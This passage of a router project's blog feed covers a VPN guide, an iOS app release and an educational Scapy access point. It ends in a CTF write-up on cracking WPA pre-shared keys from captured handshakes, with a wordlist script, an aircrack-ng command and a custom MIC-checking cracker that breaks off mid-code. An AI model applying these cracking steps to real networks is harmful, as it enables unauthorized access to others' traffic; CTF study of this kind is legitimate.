<p>Alternately, when connected to the VPN, the default address for the SPR frontend will be at 192.168.2.1. This can be updated
under the 'supernetworks' panel.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>With this guide we've described how to setup virtual SPR to get a secure, self-hosted VPN for $4/month. The setup allows <em>you</em> to route and redirect traffic, block ads, and automate networks tasks.</p>
<p>See the <a href="https://github.com/spr-networks/spr-virtual-image-build" target="_blank" rel="noopener noreferrer">spr-virtual-image-build</a> repository on GitHub for how the image is built.</p>
<p>Read more about running SPR in the cloud in <a href="https://www.supernetworks.org/pages/blog/virtual%20SPR#configure-the-vpn-client-on-your-device">the Virtual SPR Guide</a>.</p>]]></content>
        <author>
            <name>Philip Olausson</name>
            <uri>https://twitter.com/capslcc</uri>
        </author>
        <category label="SPR" term="SPR"/>
        <category label="Virtual" term="Virtual"/>
        <category label="Cloud" term="Cloud"/>
        <category label="VPN" term="VPN"/>
        <category label="WireGuard" term="WireGuard"/>
        <category label="DigitalOcean" term="DigitalOcean"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[SPR Now Available on the iOS App Store]]></title>
        <id>https://www.supernetworks.org/pages/blog/ios-app-released</id>
        <link href="https://www.supernetworks.org/pages/blog/ios-app-released"/>
        <updated>2023-05-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Secure Private Router Configuration Made Easy]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="secure-private-router-configuration-made-easy">Secure Private Router Configuration Made Easy<a href="https://www.supernetworks.org/pages/blog/ios-app-released#secure-private-router-configuration-made-easy" class="hash-link" aria-label="Direct link to Secure Private Router Configuration Made Easy" title="Direct link to Secure Private Router Configuration Made Easy">​</a></h2>
<p>We are happy to announce the release of our iOS app for the SPR project. You can manage your SPR effortlessly, even while you're on the go with the VPN capabilities. The App is available today for $0.99. Revenue goes towards the development of SPR.</p>
<div style="display:flex;flex-direction:row;padding:4px;gap:8px;margin-bottom:20px"><a href="https://apps.apple.com/us/app/secure-programmable-router/id6443709201"><img src="https://www.supernetworks.org/pages/assets/images/appdownload-e51a3478d5e8eff4fdaedf366316cdd8.png" width="20%"></a></div>
<p><a href="https://www.supernetworks.org/pages/docs/intro">Read more about SPR here</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="simplified-configuration">Simplified Configuration<a href="https://www.supernetworks.org/pages/blog/ios-app-released#simplified-configuration" class="hash-link" aria-label="Direct link to Simplified Configuration" title="Direct link to Simplified Configuration">​</a></h3>
<p>You can set up your new router, configure network firewall rules, manage devices, and
establish secure VPN connections with just a few taps.</p>
<div style="display:flex;flex-direction:row;padding:4px;gap:8px;margin-bottom:20px"><img src="https://www.supernetworks.org/pages/assets/images/ios-home-ac4735cb1265b69dad78ea1e26636e8d.png" width="50%"><img src="https://www.supernetworks.org/pages/assets/images/ios-home-2-d281e5770730f5910d2e723ef47e3c24.png" width="50%"></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="connect-your-friends-quickly-and-securely">Connect Your Friends Quickly and Securely<a href="https://www.supernetworks.org/pages/blog/ios-app-released#connect-your-friends-quickly-and-securely" class="hash-link" aria-label="Direct link to Connect Your Friends Quickly and Securely" title="Direct link to Connect Your Friends Quickly and Securely">​</a></h3>
<p>With the SPR App you can securely bring a new device onto your wifi network in only a few seconds.
To do so, add a new device, set a name, and hit next to generate a secure password.
Then scan the QR code from the new device and it will be good to go.</p>
<div style="display:flex;flex-direction:row;padding:4px;gap:8px;margin-bottom:20px"><img src="https://www.supernetworks.org/pages/assets/images/ios-device-add-1-33b35f32c7e43c90522cfe06b5a0b0e7.png" width="50%"><img src="https://www.supernetworks.org/pages/assets/images/ios-device-add-2-c152f9644f60e0cde49871a013c266d7.png" width="50%"></div>
<p>By default, the new device has access to just the internet and nothing else.
You can join it into groups for access to local network devices. For example,
a gaming group for playing LAN networked games.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ad-blocking-and-dns-controls">Ad Blocking and DNS Controls<a href="https://www.supernetworks.org/pages/blog/ios-app-released#ad-blocking-and-dns-controls" class="hash-link" aria-label="Direct link to Ad Blocking and DNS Controls" title="Direct link to Ad Blocking and DNS Controls">​</a></h3>
<p>Enhance your browsing experience by blocking intrusive ads at the network level. You can also view and customize your network device's DNS requests.</p>
<div style="display:flex;flex-direction:row;padding:4px;gap:8px;margin-bottom:20px"><img src="https://www.supernetworks.org/pages/assets/images/ios-dns-block-4f61b3bb0cf5c866a8fa492003af4fb9.png" width="50%"><img src="https://www.supernetworks.org/pages/assets/images/ios-dns-af32397f0ea6d685f4dc1ed0a67f97c6.png" width="50%"></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="remote-configuration-via-vpn">Remote Configuration via VPN<a href="https://www.supernetworks.org/pages/blog/ios-app-released#remote-configuration-via-vpn" class="hash-link" aria-label="Direct link to Remote Configuration via VPN" title="Direct link to Remote Configuration via VPN">​</a></h3>
<p><img decoding="async" loading="lazy" alt="spr vpn client" src="https://www.supernetworks.org/pages/assets/images/spr-vpn-client-29b232fdde643ccfaee9e7828d5cb947.png" width="1412" height="580" class="img_ev3q"></p>
<p>SPR works great for turning your home network into a personal VPN service. You can also host SPR in the cloud.
Using SPR to VPN your mobile devices helps get better network speeds to work around operator traffic shaping, as well as keep access to media services while traveling. And it's also helpful to maintain ad blocking while on the go, without adding any software at all to your devices.</p>
<p>With the App you can manage your SPR over the VPN itself.</p>
<div style="display:flex;flex-direction:row;padding:4px;gap:8px;margin-bottom:20px"><img src="https://www.supernetworks.org/pages/assets/images/ios-vpn-f1d07d004130708578473994edb5bc15.png" width="50%"><img src="https://www.supernetworks.org/pages/assets/images/ios-vpn-2-6fdda12865a53426390957dc457c4820.png" width="50%"></div>
<p>To learn more about running SPR using VPN, with all its features except WiFi, check out the <a href="https://www.supernetworks.org/pages/docs/setup_guides/virtual_spr"> Virtual SPR Setup Guide</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="next-steps">Next Steps<a href="https://www.supernetworks.org/pages/blog/ios-app-released#next-steps" class="hash-link" aria-label="Direct link to Next Steps" title="Direct link to Next Steps">​</a></h3>
<p>If you'd like to experience the power of open-source networking and take control of your network's security and privacy,
give SPR a try.</p>
<p>Whether you're connecting directly to your SPR device or remotely through a VPN, our app offers a seamless and intuitive interface, empowering you to create a hardened and resilient home network environment.</p>
<p>You can <a href="https://apps.apple.com/en/app/secure-programmable-router/id6443709201" target="_blank" rel="noopener noreferrer">download our iOS app</a> today.
Visit our <a href="https://www.supernetworks.org/" target="_blank" rel="noopener noreferrer">homepage</a> to learn more.</p>
<p>The source code for the app is <a href="https://github.com/spr-networks/super/tree/main/frontend" target="_blank" rel="noopener noreferrer">available on GitHub</a>.</p>
<p><strong>App Privacy and Privacy Policy</strong></p>
<div class="app-privacy__cards" style="margin-bottom:20px"><div class="app-privacy__card" style="background-color:#f8f8f8;padding:28px 20px 20px 20px;border-radius:16px;text-align:center"><div class="privacy-type__icon"><svg style="fill:#0070c9" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 64 64" aria-hidden="true"><path d="M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zm0-4.932c-13.692 0-24.628-10.964-24.628-24.655 0-13.692 10.907-24.656 24.598-24.656 13.691 0 24.656 10.964 24.685 24.656.03 13.69-10.965 24.655-24.656 24.655zM28.897 45.76c.958 0 1.77-.464 2.35-1.363L44.504 23.54c.32-.551.696-1.219.696-1.857 0-1.276-1.16-2.117-2.378-2.117-.725 0-1.45.435-2.002 1.305l-12.038 19.29-5.714-7.368c-.696-.928-1.334-1.19-2.146-1.19-1.248 0-2.234 1.016-2.234 2.321 0 .61.261 1.247.667 1.799l7.078 8.673c.725.957 1.508 1.363 2.465 1.363z"></path></svg></div><h3 class="privacy-type__heading">Data Not Collected</h3><p class="privacy-type__description">Supernetworks, Inc. does not collect any data from this app.</p></div></div>
<p>We do not collect any personal information about you, such as your name, address, or email address, when you use our app.</p>
<p>Our app does not use any third-party services that collect or use personal information. We may receive crash logs from Apple which include anonymized code stack traces from where the errors occured.</p>
<p>We do not share customer data with any third-party services.</p>
<p><a href="https://www.supernetworks.org/privacy-policy.html" target="_blank" rel="noopener noreferrer">Read our Privacy Policy here</a></p>]]></content>
        <author>
            <name>Philip Olausson</name>
            <uri>https://twitter.com/capslcc</uri>
        </author>
        <category label="iOS" term="iOS"/>
        <category label="WiFi" term="WiFi"/>
        <category label="VPN" term="VPN"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Barely AP is Almost an Access Point]]></title>
        <id>https://www.supernetworks.org/pages/blog/barely-ap</id>
        <link href="https://www.supernetworks.org/pages/blog/barely-ap"/>
        <updated>2023-05-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Introducing Barely AP]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introducing-barely-ap">Introducing Barely AP<a href="https://www.supernetworks.org/pages/blog/barely-ap#introducing-barely-ap" class="hash-link" aria-label="Direct link to Introducing Barely AP" title="Direct link to Introducing Barely AP">​</a></h2>
<p>We've <a href="https://github.com/spr-networks/barely-ap" target="_blank" rel="noopener noreferrer">published barely an implementation of a WiFi 802.11 Access Point, using Scapy</a> to teach people about WiFi authentication.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="what">What<a href="https://www.supernetworks.org/pages/blog/barely-ap#what" class="hash-link" aria-label="Direct link to What" title="Direct link to What">​</a></h3>
<p>On Linux, this code lets you spin up a python access point over monitor mode.  It implements features like handling probe requests, authentication, association, and reassociation, and encryption and decryption of data using CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="note">Note<a href="https://www.supernetworks.org/pages/blog/barely-ap#note" class="hash-link" aria-label="Direct link to Note" title="Direct link to Note">​</a></h3>
<p>This code just barely gets the job done -- it should NOT be used as a reference for writing production code. It has NO protocol security, as it is not security robust despite performing authenticated CCMP encryption.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="usage">Usage:<a href="https://www.supernetworks.org/pages/blog/barely-ap#usage" class="hash-link" aria-label="Direct link to Usage:" title="Direct link to Usage:">​</a></h3>
<p>Building &amp; running</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">./build.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./setup.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Inspect IP traffic</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker exec -it barely-ap tcpdump -i scapyap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker exec -it barely-sta tcpdump -i wlan1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="Python" term="Python"/>
        <category label="Scapy" term="Scapy"/>
        <category label="WiFi" term="WiFi"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[March 2023's Turtles Challenge]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-turtles-march</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-turtles-march"/>
        <updated>2023-05-05T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Editor's note:]]></summary>
        <content type="html"><![CDATA[<h4 class="anchor anchorWithStickyNavbar_LWe7" id="editors-note">Editor's note:<a href="https://www.supernetworks.org/pages/blog/spr-turtles-march#editors-note" class="hash-link" aria-label="Direct link to Editor's note:" title="Direct link to Editor's note:">​</a></h4>
<p>The Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.</p>
<p>The tasks were a bit challenging, and invovled a combination of WiFi Cracking and exploring how WPA Authentication works,
against a custom Access point using Salsa20 instead of AES.</p>
<p><a href="https://twitter.com/0vercl0k" target="_blank" rel="noopener noreferrer">Axel Souchet</a> has kindly shared his writeup with us, which we share below.</p>
<h1>Turtles: Virtual WiFi Hacking Challenges - March 2023</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://www.supernetworks.org/pages/blog/spr-turtles-march#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>The older I get, the more fascinated I have become with the world surrounding me; I ask myself all the time 'how does this thing work uh 🤔?'. It is both fun and rewarding for me to understand the world a bit better. This is also a great way to be constantly humbled by the magic that surrounds us 🌈</p>
<p>Although I enjoy the process of learning how things work, there are millions of things that I interact with daily, that I know so little about; embarrassing.</p>
<p>Heck, how does WiFi work I thought? Because I know that I learn best by getting my hands dirty, I decided to try to solve a few challenges as an introduction. That is why I decided to check-out the March <a href="https://turtles.supernetworks.org/" target="_blank" rel="noopener noreferrer">Turtle challenge</a> 🙂</p>
<p>If you want to play at home, you can find the challenges on Github and one the SPR website:</p>
<ul>
<li><a href="https://turtles.supernetworks.org/march" target="_blank" rel="noopener noreferrer">https://turtles.supernetworks.org/march</a></li>
<li><a href="https://github.com/spr-networks/turtles-march-2023" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/turtles-march-2023</a></li>
</ul>
<p>You can participate either directly from your browser via an impressive emulated Linux environment or you can self-host the challenge by cloning the <a href="https://github.com/spr-networks/turtles-march-2023" target="_blank" rel="noopener noreferrer">turtles-march-2023</a> repository and follow the instructions. I chose to self-host the challenges as it made it easier to debug for me.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="warmups">Warmups<a href="https://www.supernetworks.org/pages/blog/spr-turtles-march#warmups" class="hash-link" aria-label="Direct link to Warmups" title="Direct link to Warmups">​</a></h2>
<p>All right, enough blah blah and let's get warmed up. In that part of the challenge, we are asked to extract data off two packet captures: <code>turtle0.pcap</code> &amp; <code>turtle0.5.pcap</code>.</p>
<p>For the first capture, we need to extract a PSK that looks like the following: <code>turtle{x}</code>, great. Because we don't have more details regarding the PSK's shape itself, it is fair to assume that the authors want us to use a wordlist attack instead of trying to bruteforce it.</p>
<p>I grabbed the famous <a href="https://github.com/zacheller/rockyou" target="_blank" rel="noopener noreferrer">rockyou</a> wordlist and I wrote a small Python script to format prepend / append <code>turtle{}</code> as this is what the PSK will look like.</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'rockyou-turtle.txt'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'w'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> encoding</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'utf8'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> fout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'rockyou.txt'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'r'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> encoding</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'utf8'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> errors</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'replace'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> line </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">readlines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            line </span><span class="token operator">=</span><span class="token plain"> line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            fout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f'turtle{{</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">line</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">}}\n'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'Done'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then, I ran <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener noreferrer">aircrack-ng</a> with the new wordlist against <code>turtle0.pcap</code> with the following command: <code>$ aircrack-ng turtle0.pcap -w rockyou-turtle.txt</code>.</p>
<p>After a few minutes, a valid key was found: <code>turtle{power}</code>, great!</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">                        Aircrack-ng 1.6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[00:00:01] 3200/2465175 keys tested (5273.73 k/s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Time left: 7 minutes, 46 seconds                           0.13%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    KEY FOUND! [ turtle{power} ]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Master Key     : 11 8C 23 85 2D 5F 7E AC DE 8C 85 B0 CB 80 02 5F</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                CA 48 34 DF CE 2D 2A 7C 3C 01 4B A8 14 B7 2D E1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">EAPOL HMAC     : 6B D2 F8 71 7F E5 D8 5E 5B 68 FE 53 0A 28 9D 4E</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The next challenge says that there is data to be decrypted inside <code>turtle0.5.pcap</code>. Both the station and the AP use the <a href="https://en.wikipedia.org/wiki/IEEE_802.11i-2004" target="_blank" rel="noopener noreferrer">4-way handshake</a> to derive various keys that are used to encrypt traffic. We cracked a PSK in the previous step, so we can  open the packet capture into <a href="https://www.wireshark.org/" target="_blank" rel="noopener noreferrer">Wireshark</a> and let it decrypt the traffic for us. Follow Wireshark's <a href="https://wiki.wireshark.org/HowToDecrypt802.11" target="_blank" rel="noopener noreferrer">HowToDecrypt802.11</a> article to know how to do that.</p>
<p>Once decrypted, there is a <code>PING</code> request with a flag in its payload: <code>turtle{deecoded}</code>, awesome.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-1">Step 1<a href="https://www.supernetworks.org/pages/blog/spr-turtles-march#step-1" class="hash-link" aria-label="Direct link to Step 1" title="Direct link to Step 1">​</a></h2>
<p>Okay warmups done, time to have a look at the real challenges. For this step, the authors ask for us to crack another PSK from another packet capture of a handshake. We also have the <a href="https://github.com/spr-networks/turtles-march-2023/blob/main/t1_start/turtle1-ap-pcap.py" target="_blank" rel="noopener noreferrer">source code of a custom AP</a>.</p>
<p>I initially threw <code>turtle1-handshake.pcap</code> at <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener noreferrer">aircrack-ng</a> with the <code>rockyou-turtle.txt</code> wordlist but no valid key was found, bummer. I thought it was possible that this key was part of another famous wordlist so I downloaded a bunch of them, but ... same. Weird.</p>
<p>I learned more about the 4-way handshake to understand how both the station &amp; AP derive the keys needed to transmit / verify encrypted frames. Because the handshake was captured from a custom AP, it made sense to me that maybe <a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener noreferrer">aircrack-ng</a> didn't understand the handshake properly and missed PSK.</p>
<p>I decided to implement the attack on my own. I used the MIC code that is sent by the AP in the 3rd message to verify if a candidate is valid or not (on top of the nonces/macs in the first / second messages). We have the entire EAPOL packet so we can compute the MIC code ourselves and verify if it matches the one sent by the AP. If it does, it means we have found a valid PSK 🤤</p>
<p>I ran the script against the <em>turtleified</em> rockyou wordlist, and eventually (it's slow!) found a valid PSK candidate: <code>turtle{excellent}</code> 🔥</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Axel '0vercl0k' Souchet - April 15 2023</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># WIN w/ b'turtle{excellent}'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hashlib</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hmac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> scapy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">all</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">EAPOL_KEY</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">Packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    name </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'EAPOL_KEY'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    fields_desc </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ByteEnumField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_descriptor_type'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token 